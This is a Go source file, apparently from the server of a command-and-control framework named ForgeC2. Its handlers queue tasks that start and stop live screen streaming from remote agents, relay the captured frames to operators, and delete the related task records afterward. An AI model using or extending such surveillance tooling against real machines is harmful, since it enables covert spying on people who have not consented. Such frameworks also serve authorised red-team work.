package server

import (
	"bytes"
	"encoding/json"
	"html/template"
	"log/slog"
	"net/http"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

func (s *Server) handleScreenMonitorPage(c *gin.Context) {
	id := c.Param("id")

	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.Redirect(http.StatusFound, "/agents")
		return
	}

	stats := s.getNavStats()
	data := gin.H{
		"Title":     "ForgeC2 - Screen Monitoring",
		"Agent":     agent,
		"ActiveNav": "agents",
		"Online":    time.Since(agent.LastSeen) < s.offlineThreshold(),
	}
	s.addUserToData(c, data)
	for k, v := range stats {
		data[k] = v
	}

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "screen_content", data); err != nil {
		slog.Error("Failed to render content", "err", err)
		c.String(http.StatusInternalServerError, "Template error")
		return
	}

	data["Content"] = template.HTML(contentBuf.String())

	c.Header("Content-Type", "text/html; charset=utf-8")
	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
}

func (s *Server) handleStartScreenMonitor(c *gin.Context) {
	id := c.Param("id")

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	s.screenMonitorMu.Lock()
	s.screenMonitorAgents[strings.ToLower(id)] = time.Now()
	s.screenMonitorMu.Unlock()

	task, err := s.createTask(id, "screen_stream_start", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Screen monitor: failed to create task", "agent_id", id, "err", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	s.LogAuditRecord(c, "screen_monitor_start", "agent", id, "Started screen monitoring", true, nil)
	slog.Info("Screen monitoring started", "agent", id, "task_id", task.ID)
	c.JSON(http.StatusOK, gin.H{"success": true, "message": "Screen stream started"})
}

func (s *Server) handleStopScreenMonitor(c *gin.Context) {
	id := c.Param("id")

	s.screenMonitorMu.Lock()
	startTime, ok := s.screenMonitorAgents[strings.ToLower(id)]
	delete(s.screenMonitorAgents, strings.ToLower(id))
	s.screenMonitorMu.Unlock()

	if ok {
		s.db.Where("agent_id = ? AND created_at >= ? AND type IN (?)", id, startTime,
			[]string{"screenshot", "screen_stream_start"}).
			Delete(&db.Task{})
	}

	stopTask, err := s.createTask(id, "screen_stream_stop", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Screen monitor stop: failed to create task", "agent_id", id, "err", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create stop task"})
		return
	}
	s.broadcastTaskUpdate(id, *stopTask)

	s.LogAuditRecord(c, "screen_monitor_stop", "agent", id, "Stopped screen monitoring", true, nil)
	slog.Info("Screen monitoring stopped", "agent", id)
	c.JSON(http.StatusOK, gin.H{"success": true})
}

func (s *Server) IsScreenMonitoring(agentID string) bool {
	s.screenMonitorMu.Lock()
	defer s.screenMonitorMu.Unlock()
	_, ok := s.screenMonitorAgents[strings.ToLower(agentID)]
	return ok
}

func (s *Server) BroadcastScreenshot(agentID string, base64Data string) {
	payload := map[string]string{
		"type":     "screenshot",
		"agent_id": agentID,
		"data":     base64Data,
	}
	message, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal screenshot payload", "err", err)
		return
	}

	s.broadcastToClients(message)
}

func (s *Server) handleScreenFrame(c *gin.Context) {
	var req struct {
		UUID string `json:"uuid"`
		Data string `json:"data"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid json"})
		return
	}
	if req.UUID == "" || req.Data == "" {
		c.JSON(http.StatusOK, gin.H{"ok": true})
		return
	}

	if s.IsScreenMonitoring(req.UUID) {
		s.BroadcastScreenshot(req.UUID, req.Data)
	}

	c.JSON(http.StatusOK, gin.H{"ok": true})
}
